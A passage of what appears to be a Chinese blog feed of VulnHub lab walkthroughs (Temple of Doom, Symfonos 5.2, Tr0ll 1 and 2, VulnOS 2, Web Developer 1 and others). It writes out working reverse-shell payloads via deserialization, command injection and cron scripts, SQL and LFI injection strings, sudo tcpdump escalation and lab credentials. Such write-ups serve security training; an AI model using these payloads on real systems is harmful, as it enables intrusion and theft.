<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -R 9999:127.0.0.1:8080 root@192.168.1.201</span><br></pre></td></tr></table></figure>

<p>接着访问本地</p>
<p><img src="/images/Symfonos-4/10.png" alt="10"></p>
<p>发现了一段奇怪的cookie，将其base64解码</p>
<p><img src="/images/Symfonos-4/11.png" alt="11"></p>
<p>看起来是json pickle的反序列化利用，可以寻找到一些帮助(<a href="https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/?__cf_chl_captcha_tk__=241e2009de991b5ef1f1f40662ca46ed65b10648-1600455962-0-AdaCqDDsUBTI2UhZh1pkqF1dc_VslfEn-f21ct-IAZMXR5ItUSLH73MCXTHZmV1erktFSLAo7MU6NOh0YPbFdmK-AB-A1IaSYM5qyiRcKXezSiRIf7jyET2usqGNH34kwbm1gltvIty-T5JvAOvcpjNXjb-LQ1XMPTwrure3s2EBK9-jqEbk2ULvJNsgycIWOCZ7zefUq2byb8WO6ZPdnyRhaBvyL0vf4uoPMXi-eKL8JnAaPkkNgEglc22yqEojsuLhUI-HTIWS6OWOuJeYR1ONTNS02Vck9cuKQLU2t_JJ4yu8Oz4ALiZY8iXcsPGjw-tpf0QyeYKgAC-OXlYJ68BhP8yDMx8igcF2_uJX3ShKtUNJxosDglWTf4XAnKaTuPVfgRV32O6dspqe-Cb-uT08FpWnwR4rd3R34CazVBvrIPLe5kplVQzblKJIa-MVNPPYTXjKejuTi6nRo8AOyMv1GVy8ZN6Ra9lAFr6-oeYn5JCxOaGh9cM7A9DHTeZJLQQBk1rPe1XJd0nXOTCRnB_9Ov4aKoUpylyZBGrh2S1AzC0-6rs-0up4Tn35GXFFdw">链接</a>)</p>
<p>将payload进行base64编码后发过去，我们就能获得一个shell了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;py&#x2F;object&quot;:&quot;__main__.Shell&quot;,&quot;py&#x2F;reduce&quot;:[&#123;&quot;py&#x2F;function&quot;:&quot;os.system&quot;&#125;,[&quot;&#x2F;usr&#x2F;bin&#x2F;nc -e &#x2F;bin&#x2F;sh 192.168.1.201 4444&quot;], 0, 0, 0]&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-4/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Temple of Doom</title>
    <url>/2020/09/15/%E9%9D%B6%E5%9C%BATemple-of-Doom/</url>
    <content><![CDATA[<h1 id="Temple-of-Doom"><a href="#Temple-of-Doom" class="headerlink" title="Temple of Doom"></a>Temple of Doom</h1><p>kali:192.168.1.201<br>目标:192.168.1.229</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.229 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.229 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/1.png" alt="1"></p>
<p>发现http端口666，并且使用了Node.js</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>dirbuster枚举，什么都没发现</p>
<p>但在主页有一些发现</p>
<p>第一次访问</p>
<p><img src="/images/TempleofDoom/2.png" alt="2"></p>
<p>之后再次访问</p>
<p><img src="/images/TempleofDoom/3.png" alt="3"></p>
<p>发现后端使用JSON，比较两次请求的差异</p>
<p>主要是第一次请求后，它给我设置了一个cookie，第二次请求携带了这段cookie</p>
<p><img src="/images/TempleofDoom/4.png" alt="4"></p>
<p>末尾看到%3D，这是一个常见的URL编码(等号)，我们先进行URL解码，再base64</p>
<p><img src="/images/TempleofDoom/5.png" alt="5"></p>
<p>一段序列化数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Admin&quot;,&quot;csrftoken&quot;:&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l&#x3D;&quot;,&quot;Expires&#x3D;&quot;:Friday, 13 Oct 2018 00:00:00 GMT&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以发现它出现的语法错误，Expires的值少个分号</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;Admin&quot;,&quot;csrftoken&quot;:&quot;u32t4o3tb3gg431fs34ggdgchjwnza0l&#x3D;&quot;,&quot;Expires&#x3D;&quot;:&quot;Friday, 13 Oct 2018 00:00:00 GMT&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>修复后，进行base64编码，再URL编码给发送过去</p>
<p><img src="/images/TempleofDoom/6.png" alt="6"></p>
<p>看来是个Node.js的unserialize漏洞</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>谷歌搜索Node.js 反序列化漏洞，你就可以找到很多的PoC</p>
<p>ls-l</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;ls -l &#x2F;&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>对其base64，再URL编码发送过去</p>
<p><img src="/images/TempleofDoom/7.png" alt="7"></p>
<p>whoami</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;whoami&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/8.png" alt="8"></p>
<p>成功获得了RCE<br>直接反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&quot;username&quot;:&quot;_$$ND_FUNC$$_function()&#123;return require(&#39;child_process&#39;).execSync(&#39;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.201 443 1&gt;&#x2F;tmp&#x2F;f&#39;,(e,out,err)&#x3D;&gt;&#123;console.log(out);&#125;); &#125;()&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/9.png" alt="9"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>提权有点小隐蔽</p>
<p><img src="/images/TempleofDoom/10.png" alt="10"></p>
<p>可以发现fireman在运行ss-manager，这是一个不可描述的软件，俗称小飞机</p>
<p><img src="/images/TempleofDoom/11.png" alt="11"></p>
<p>我们可以找到它也会受到json注入攻击，payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -u 127.0.0.1 8839</span><br><span class="line">add: &#123;&quot;server_port&quot;:8003, &quot;password&quot;:&quot;test&quot;, &quot;method&quot;:&quot;||&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;4444  0&gt;&amp;1||&quot;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/12.png" alt="12"></p>
<p>接下来的提权就很显眼了</p>
<p><img src="/images/TempleofDoom/13.png" alt="13"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;nc -nv 192.168.1.201 8080 -e &#x2F;bin&#x2F;bash&#39; &gt; evil</span><br><span class="line">sudo tcpdump -ln -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z &#x2F;tmp&#x2F;evil -Z root</span><br></pre></td></tr></table></figure>

<p><img src="/images/TempleofDoom/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Toppo 1</title>
    <url>/2020/09/22/%E9%9D%B6%E5%9C%BAToppo-1/</url>
    <content><![CDATA[<h1 id="Toppo-1"><a href="#Toppo-1" class="headerlink" title="Toppo 1"></a>Toppo 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><img src="/images/Toppo-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><img src="/images/Toppo-1/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现了隐藏文件</p>
<p><img src="/images/Toppo-1/3.png" alt="3"></p>
<p>可以猜测，登录凭据为ted/12345ted123</p>
<p><img src="/images/Toppo-1/4.png" alt="4"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/Toppo-1/6.png" alt="6"></p>
<p>SUID提权</p>
<p><img src="/images/Toppo-1/5.png" alt="5"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 5.2</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-5-2/</url>
    <content><![CDATA[<h1 id="靶场Symfonos-5-2"><a href="#靶场Symfonos-5-2" class="headerlink" title="靶场Symfonos 5.2"></a>靶场Symfonos 5.2</h1><p>kali:192.168.1.201<br>目标:192.168.1.206</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.206 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.206 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-5-2/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>尝试直接进行ldap枚举，失败</p>
<p>对80端口进行枚举，选中php扩展</p>
<p><img src="/images/Symfonos-5-2/2.png" alt="2"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>发现登录页面</p>
<p><img src="/images/Symfonos-5-2/3.png" alt="3"></p>
<p>进行常规sql注入，失败<br>考虑到之前扫描发现了389端口，这里尝试使用LDAP注入</p>
<p>但我缺乏这个注入的知识，只能找个投机取巧的方法，PayloadsAllTheThings的fuzz字典，<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/LDAP%20Injection/Intruder/LDAP_FUZZ.txt">链接</a></p>
<p><img src="/images/Symfonos-5-2/4.png" alt="4"></p>
<p>之后你就可以发现一些不同的请求<br>重放这个包</p>
<p><img src="/images/Symfonos-5-2/5.png" alt="5"></p>
<p>发现302跳转</p>
<p><img src="/images/Symfonos-5-2/6.png" alt="6"></p>
<p>发现了home.php携带的url参数</p>
<p>看样子是一个RFI漏洞，我们可以尝试包含</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;home.php?url&#x3D;http:&#x2F;&#x2F;192.168.1.201&#x2F;a</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-5-2/7.png" alt="7"></p>
<p>可以发现请求成功了，查看请求</p>
<p><img src="/images/Symfonos-5-2/8.png" alt="8"></p>
<p>没有被解释，不好的消息，看来无法直接通过RFI来获取shell<br>尝试读取一些本地文件</p>
<p><img src="/images/Symfonos-5-2/9.png" alt="9"></p>
<p>通过/etc/passwd，并没有能够发现一些有趣的用户<br>尝试读取刚刚的验证页面，admin.php的源码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.206&#x2F;home.php?url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;admin.php</span><br></pre></td></tr></table></figure>

<p>base64解码后，读取源码</p>
<p><img src="/images/Symfonos-5-2/10.png" alt="10"></p>
<p>通过这个操作，竟然成功发现了存在其中的ldap凭据，利用它我们可以进行ldap的枚举<br>再去查看一下home.php的源码，看看为什么RFI不能利用</p>
<p><img src="/images/Symfonos-5-2/11.png" alt="11"></p>
<p>原来只有file_get_contents，所以只能读文件<br>接着利用ladp的凭证进行枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p 389 --script ldap-search --script-args &#39;ldap.username&#x3D;&quot;cn&#x3D;admin,dc&#x3D;symfonos,dc&#x3D;local&quot;, ldap.password&#x3D;&quot;qMDdyZh3cT6eeAWD&quot;&#39; 192.168.1.206</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-5-2/12.png" alt="12"></p>
<p>通过这个，我们发现了zeus账户的密码，直接尝试ssh</p>
<p><img src="/images/Symfonos-5-2/13.png" alt="13"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas</p>
<p><img src="/images/Symfonos-5-2/14.png" alt="14"></p>
<p>发现sudo存在dpkg命令，直接进行提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo dpkg -l</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-5-2/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Tr0ll 1</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BATr0ll-1/</url>
    <content><![CDATA[<h1 id="Tr0ll-1"><a href="#Tr0ll-1" class="headerlink" title="Tr0ll 1"></a>Tr0ll 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.243</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.243 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.243 -oN nmap</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tr0ll-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>21允许匿名登录，查看</p>
<p><img src="/images/Tr0ll-1/2.png" alt="2"></p>
<p>wireshark查看它</p>
<p><img src="/images/Tr0ll-1/3.png" alt="3"></p>
<p>进一步检查</p>
<p><img src="/images/Tr0ll-1/4.png" alt="4"></p>
<p>得到了<code>sup3rs3cr3tdirlol</code></p>
<p>80端口访问</p>
<p><img src="/images/Tr0ll-1/5.png" alt="5"></p>
<p>简单查看</p>
<p><img src="/images/Tr0ll-1/6.png" alt="6"></p>
<p>80再次访问</p>
<p><img src="/images/Tr0ll-1/7.png" alt="7"></p>
<p>得到两个字典</p>
<p>尝试ssh登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh overflow@192.168.1.243</span><br><span class="line">Pass.txt</span><br></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>

<h3 id="方法1-定时任务"><a href="#方法1-定时任务" class="headerlink" title="方法1 定时任务"></a>方法1 定时任务</h3><p>可以用pspy检测</p>
<p><img src="/images/Tr0ll-1/8.png" alt="8"></p>
<p>这里并没有/etc/crontab里发现，但在/var/log里发现了一个日志</p>
<p><img src="/images/Tr0ll-1/9.png" alt="9"></p>
<p>而<code>/lib/log/cleaner.py</code>我们也可以写，直接给你整一个os执行的反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">import os</span><br><span class="line">import sys</span><br><span class="line">try:</span><br><span class="line">        os.system(&#39;rm -rf &#x2F;tmp&#x2F;f;mknod &#x2F;tmp&#x2F;f p;&#x2F;bin&#x2F;sh 0&lt;&#x2F;tmp&#x2F;f | nc 192.168.1.201 443 1&gt;&#x2F;tmp&#x2F;f&#39;)</span><br><span class="line">except:</span><br><span class="line">        sys.exit() </span><br></pre></td></tr></table></figure>

<p><img src="/images/Tr0ll-1/10.png" alt="10"></p>
<p>成功</p>
<p><img src="/images/Tr0ll-1/11.png" alt="11"></p>
<h3 id="方法2-内核提权"><a href="#方法2-内核提权" class="headerlink" title="方法2 内核提权"></a>方法2 内核提权</h3><p>之前碰到过</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">overflow@troll:&#x2F;$ cat &#x2F;etc&#x2F;issue</span><br><span class="line">Ubuntu 14.04.1 LTS \n \l</span><br><span class="line"></span><br><span class="line">overflow@troll:&#x2F;$ uname -r</span><br><span class="line">3.13.0-32-generic</span><br></pre></td></tr></table></figure>

<p>37292.c</p>
<p><img src="/images/Tr0ll-1/12.png" alt="12"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场VulnOS 2</title>
    <url>/2020/09/13/%E9%9D%B6%E5%9C%BAVulnOS-2/</url>
    <content><![CDATA[<h1 id="VulnOS2"><a href="#VulnOS2" class="headerlink" title="VulnOS2"></a>VulnOS2</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.249</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.249 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.249 -oN nmap</span><br></pre></td></tr></table></figure>

<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>枚举web服务</p>
<p>看图标，应该运行着drupal</p>
<p><img src="/images/VulnOS-2/2.png" alt="2"></p>
<p>信息枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">droopescan scan drupal -u http:&#x2F;&#x2F;192.168.1.249&#x2F;jabc&#x2F; -t 32</span><br></pre></td></tr></table></figure>

<p><img src="/images/VulnOS-2/3.png" alt="3"></p>
<p>枚举出了信息，手动检查</p>
<p><img src="/images/VulnOS-2/4.png" alt="4"></p>
<p>发现了另一个目录/jabcd0cs/</p>
<p><img src="/images/VulnOS-2/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接搜索漏洞</p>
<p><img src="/images/VulnOS-2/6.png" alt="6"></p>
<p><img src="/images/VulnOS-2/7.png" alt="7"></p>
<p>根据文档直接找到一处sql注入</p>
<p>爆出数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jabcd0cs</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odm_user UNION SELECT 1,TABLE_NAME,3,4,5,6,7,8,9 from information_schema.TABLES </span><br></pre></td></tr></table></figure>

<p>爆字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odm_user UNION SELECT 1,column_name,3,4,5,6,7,8,9 from information_schema.columns </span><br></pre></td></tr></table></figure>

<p>爆出数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odm_user UNION SELECT 1,password,3,4,5,6,7,8,9 from odm_user</span><br></pre></td></tr></table></figure>

<p><img src="/images/VulnOS-2/8.png" alt="8"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">odm_user UNION SELECT 1,username,3,4,5,6,7,8,9 from odm_user</span><br></pre></td></tr></table></figure>

<p><img src="/images/VulnOS-2/9.png" alt="9"></p>
<p>解密得到</p>
<p><code>webmin/webmin1980</code></p>
<p>可以直接ssh登录</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><img src="/images/VulnOS-2/10.png" alt="10"></p>
<p>内核提权37292.c</p>
<p><img src="/images/VulnOS-2/11.png" alt="11"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Tr0ll 2</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BATr0ll-2/</url>
    <content><![CDATA[<h1 id="Tr0ll-2"><a href="#Tr0ll-2" class="headerlink" title="Tr0ll 2"></a>Tr0ll 2</h1><p>kali:192.168.1.201<br>目标:192.168.1.222</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.222 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.222 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Tr0ll-2/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>21不允许匿名登录<br>查看80，首页发现信息</p>
<p><img src="/images/Tr0ll-2/2.png" alt="2"></p>
<p>利用该账号登录ftp，下载文件，不过存在密码</p>
<p><img src="/images/Tr0ll-2/3.png" alt="3"></p>
<p>nikto扫描80，发现robots.txt</p>
<p><img src="/images/Tr0ll-2/4.png" alt="4"></p>
<p>逐个访问，发现一张图片和一个提示</p>
<p><img src="/images/Tr0ll-2/5.png" alt="5"></p>
<p>这里没有隐写，直接strings就可以发现</p>
<p><img src="/images/Tr0ll-2/6.png" alt="6"></p>
<p>访问这个目录</p>
<p><img src="/images/Tr0ll-2/7.png" alt="7"></p>
<p>得到很多base64，尝试解密</p>
<p><img src="/images/Tr0ll-2/8.png" alt="8"></p>
<p>得到了一个字典，利用该字典爆破zip</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fcrackzip -D -p decode -u lmao.zip</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tr0ll-2/9.png" alt="9"></p>
<p>解压后得到RSA密钥</p>
<p><img src="/images/Tr0ll-2/10.png" alt="10"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>尝试登录</p>
<p><img src="/images/Tr0ll-2/11.png" alt="11"></p>
<p>失败</p>
<p>尝试ssh的shellshock  exploit(利用方法<code>() &#123; :; &#125;; /bin/bash</code>)<br>payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -i noob noob@192.168.1.222 -t &quot;() &#123; :; &#125;; &#x2F;bin&#x2F;bash&quot;</span><br></pre></td></tr></table></figure>

<p>成功破壳</p>
<p><img src="/images/Tr0ll-2/12.png" alt="12"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>内核提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">noob@Tr0ll2:~$ uname -m</span><br><span class="line">i686</span><br><span class="line">noob@Tr0ll2:~$ uname -r</span><br><span class="line">3.2.0-29-generic-pae</span><br></pre></td></tr></table></figure>

<p>40839.c</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gcc -pthread 40839.c -o dirty -lcrypt</span><br></pre></td></tr></table></figure>

<p><img src="/images/Tr0ll-2/13.png" alt="13"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Web Developer 1</title>
    <url>/2020/09/17/%E9%9D%B6%E5%9C%BAWeb-Developer-1/</url>
    <content><![CDATA[<h1 id="Web-Developer-1"><a href="#Web-Developer-1" class="headerlink" title="Web Developer 1"></a>Web Developer 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.244</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.244 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.244 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Web-Developer-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80端口枚举</p>
<p><img src="/images/Web-Developer-1/2.png" alt="2"></p>
<p>发现了wordpress，这里坑了，后面我就对wordpress下手，可以用爆破枚举账户，但始终不能爆破出密码或漏洞扫描又没有发现可利用插件，浪费了一段时间</p>
<p>后来发现有个目录不在<code>directory-list-2.3-medium.txt</code>中，习惯使用这个，换个dirb的字典再扫一遍<br>选用dirb的big.txt</p>
<p><img src="/images/Web-Developer-1/3.png" alt="3"></p>
<p>我晕了，枚举必须做仔细了</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>ipdata目录下发现.cap包，wireshark分析</p>
<p><img src="/images/Web-Developer-1/4.png" alt="4"></p>
<p>仔细寻找，发现了POST数据包的wp登录请求，重中发现了凭证<code>webdeveloper/Te5eQg&amp;4sBS!Yr$)wf%(DcAd</code></p>
<p>直接修改插件</p>
<p><img src="/images/Web-Developer-1/5.png" alt="5"></p>
<p>位置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.244&#x2F;wp-content&#x2F;plugins&#x2F;akismet&#x2F;akismet.php</span><br></pre></td></tr></table></figure>

<p>这样我们就可以获取反弹shell了</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>枚举其他用户</p>
<p><img src="/images/Web-Developer-1/7.png" alt="7"></p>
<p>找到mysql连接文件</p>
<p><img src="/images/Web-Developer-1/6.png" alt="6"></p>
<p>用户名一致，尝试切换</p>
<p><img src="/images/Web-Developer-1/8.png" alt="8"></p>
<p>切换成功，sudo枚举</p>
<p><img src="/images/Web-Developer-1/9.png" alt="9"></p>
<p>发现tcpdump可以sudo执行</p>
<p>kali生成linux的reverse_shell木马</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p payload linux&#x2F;x64&#x2F;shell_reverse_tcp LHOST&#x3D;192.168.1.201 LPORT&#x3D;8080 -f elf -o evil.elf</span><br></pre></td></tr></table></figure>

<p>传输到对方tmp目录下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo tcpdump -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z &#x2F;tmp&#x2F;evil.elf -Z root</span><br></pre></td></tr></table></figure>

<p><img src="/images/Web-Developer-1/10.png" alt="10"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Zico2</title>
    <url>/2020/09/16/%E9%9D%B6%E5%9C%BAZico2/</url>
    <content><![CDATA[<h1 id="Zico2"><a href="#Zico2" class="headerlink" title="Zico2"></a>Zico2</h1><p>kali:192.168.1.201<br>目标:192.168.1.215</p>
